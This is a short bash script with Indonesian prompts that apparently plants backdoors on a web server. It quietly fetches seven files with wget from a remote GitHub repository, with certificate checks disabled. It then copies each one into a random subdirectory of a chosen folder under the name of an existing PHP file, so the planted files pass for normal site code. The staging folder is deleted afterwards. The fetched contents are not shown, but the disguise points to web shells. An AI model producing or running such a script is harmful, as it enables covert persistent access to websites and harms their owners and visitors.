#!/bin/bash

echo Silahkan masukan nama folder:
read varname
echo Hajar folder: $varname
mkdir x
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/tpp/main/deff-sg-tpp.txt
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/tpp/main/def-tpp.txt
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/tpp/main/1.txt
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/tpp/main/2.txt
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/tpp/main/tre.txt
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/tpp/main/her.txt
wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/tpp/main/lost.txt
for i in $(ls -l x/ |awk '{print $9}'|sed '/^$/d')
do
        myfile=$(find $varname -name "*.php" |rev |cut -d/ -f 1 |rev |shuf -n 1)
        mydir=$(find $varname -type d | shuf -n 1)
        if [ ! -f $mydir/$myfile ]
        then
                cp x/$i $mydir/$myfile
                echo $mydir/$myfile
        else
                xmyfile=$(find $varname -name "*.php" |rev |cut -d/ -f 1 |rev |shuf -n 1)
                xmydir=$(find $varname -type d | shuf -n 1)
                if [ ! -f $xmydir/$xmyfile ]
                then
                        cp x/$i $xmydir/$xmyfile
                        echo $xmydir/$xmyfile
                fi
        fi
done
rm -rf x
